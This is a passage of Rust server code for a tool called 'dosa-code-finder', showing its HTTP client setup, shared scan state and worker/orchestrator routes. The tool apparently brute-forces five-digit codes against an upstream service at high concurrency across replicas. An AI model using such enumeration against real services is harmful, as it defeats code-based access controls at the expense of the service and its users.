    let from = state.orch_from.load(Ordering::SeqCst);
    let to = state.orch_to.load(Ordering::SeqCst);
    Json(OrchStatus {
        running: state.orch_running.load(Ordering::SeqCst),
        found: state.orch_found.load(Ordering::SeqCst),
        valid_code: state.orch_valid_code.lock().await.clone(),
        message: state.orch_message.lock().await.clone(),
        range: if total > 0 {
            format!("{:05}..{:05}", from, to)
        } else {
            "—".to_string()
        },
        tried,
        total,
        queued,
        replicas: rep_status,
    })
}

async fn root_handler() -> Html<&'static str> {
    Html(include_str!("index.html"))
}

async fn worker_page_handler() -> Html<&'static str> {
    Html(include_str!("worker.html"))
}

async fn orchestrate_page_handler() -> Html<&'static str> {
    Html(include_str!("orchestrate.html"))
}

#[tokio::main]
async fn main() {
    let port: u16 = std::env::var("PORT")
        .ok()
        .and_then(|p| p.parse().ok())
        .unwrap_or(3000);

    // Match the prior Node.js setup as closely as possible:
    //   https.Agent({ keepAlive: true, maxSockets: 1000 })
    //
    // Specifically: force HTTP/1.1 so concurrent requests use distinct TCP
    // sockets (HTTP/2 would multiplex 50 logical requests over a single
    // socket and the upstream processes them ~sequentially). Pool a lot of
    // idle sockets so we never pay a fresh TLS handshake during the scan.
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .http1_only()
        .pool_max_idle_per_host(1000)
        .pool_idle_timeout(Duration::from_secs(90))
        .tcp_keepalive(Duration::from_secs(60))
        .user_agent(USER_AGENT)
        .build()
        .expect("build reqwest client");

    let quota = Quota::per_second(NonZeroU32::new(RATE_PER_SEC).unwrap());
    let limiter = Arc::new(RateLimiter::direct(quota));

    let state = AppState {
        client,
        is_running: Arc::new(AtomicBool::new(false)),
        code_found: Arc::new(AtomicBool::new(false)),
        stop_requested: Arc::new(AtomicBool::new(false)),
        tried: Arc::new(AtomicU64::new(0)),
        total: Arc::new(AtomicU64::new(0)),
        trial_code: Arc::new(Mutex::new("—".to_string())),
        valid_code: Arc::new(Mutex::new("—".to_string())),
        scan_range: Arc::new(Mutex::new("—".to_string())),
        ok_200: Arc::new(AtomicU64::new(0)),
        http_4xx: Arc::new(AtomicU64::new(0)),
        http_5xx: Arc::new(AtomicU64::new(0)),
        timeouts: Arc::new(AtomicU64::new(0)),
        net_errors: Arc::new(AtomicU64::new(0)),
        last_error: Arc::new(Mutex::new("—".to_string())),
        buffer: Arc::new(Mutex::new(VecDeque::new())),
        limiter,
        // Orchestrator mode (isolated).
        orch_running: Arc::new(AtomicBool::new(false)),
        orch_found: Arc::new(AtomicBool::new(false)),
        orch_valid_code: Arc::new(Mutex::new("—".to_string())),
        orch_message: Arc::new(Mutex::new(String::new())),
        orch_queue: Arc::new(Mutex::new(VecDeque::new())),
        orch_replicas: Arc::new(Mutex::new(Vec::new())),
        orch_from: Arc::new(AtomicU64::new(0)),
        orch_to: Arc::new(AtomicU64::new(0)),
        orch_started_at: Arc::new(Mutex::new(None)),
    };

    let app = Router::new()
        .route("/", get(root_handler))
        .route("/worker", get(worker_page_handler))
        .route("/start", get(start_handler))
        .route("/stop", get(stop_handler))
        .route("/status", get(status_handler))
        .route("/enqueue", post(enqueue_handler))
        .route("/start-buffered", get(start_buffered_handler))
        // Orchestrator endpoints (isolated from worker endpoints above).
        .route("/orchestrate", get(orchestrate_page_handler))
        .route("/orchestrate/start", get(orch_start_handler))
        .route("/orchestrate/stop", get(orch_stop_handler))
        .route("/orchestrate/status", get(orch_status_handler))
        .with_state(state);

    let addr = SocketAddr::from(([0, 0, 0, 0], port));
    println!("dosa-code-finder listening on {addr}");
    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}
